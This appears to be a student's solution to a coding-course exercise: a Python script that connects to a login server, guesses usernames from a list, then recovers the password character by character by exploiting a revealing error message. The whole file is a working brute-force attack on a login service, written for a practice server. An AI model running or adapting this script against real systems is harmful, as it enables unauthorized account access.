# write your code here
import sys
import socket
import itertools
import json
import string


args = sys.argv

# hostname, port, message = args[1], int(args[2]), args[3]
# Collect arguments from command-line
hostname, port = args[1], int(args[2])

def generate_alphanumeric_list():
	letters = list(map(lambda x: chr(x), list(range(ord('a'), ord('z') + 1))))
	numbers = list(map(lambda x: str(x), list(range(0, 10))))
	return letters + numbers


def send_message(sock, message):
	message = message.encode()
	sock.send(message)


def generate_combinations(string):
	# length = len(string)
	# string += string.upper()
	# string = list(string)
	# for item in itertools.combinations(string, length):
	# 	yield "".join(item)
	string = string.lower()
	mx = 2 ** len(string)

	# Using all subsequences and permuting them
	for i in range(mx):
		combination = [k for k in string]
		for j in range(len(string)):
			if ((i >> j) & 1) == 1:
				combination[j] = string[j].upper()

		yield "".join(combination)


def get_pass(login, letters=""):
	global new_socket
	alpha = string.ascii_letters + string.digits
	for ch in alpha:
		json_string1 = json.dumps({"login": login, "password": letters + ch})
		new_socket.send(json_string1.encode())
		response1 = new_socket.recv(1024)
		response1 = response1.decode()
		decoded_data1 = json.loads(response1)
		if decoded_data1["result"] == "Exception happened during login":
			return get_pass(login, letters=letters+ch)
		elif decoded_data1["result"] == "Wrong password!":
			continue
		elif decoded_data1["result"] == "Connection success!":
			return json_string1
		else:
			return "Something wrong"


new_socket = socket.socket()
address = hostname, port
new_socket.connect(address)
logins = list()

with open("logins.txt", "r") as login_file:
	logins = login_file.read().split("\n")

for login in logins:
	json_string = json.dumps({"login": login, "password": ""})
	new_socket.send(json_string.encode())
	response = new_socket.recv(1024)
	response = response.decode()
	decoded_data = json.loads(response)
	if decoded_data["result"] == "Wrong password!" or decoded_data[
		"result"] == "Exception happened during login":
		print(get_pass(login))
		break

new_socket.close()


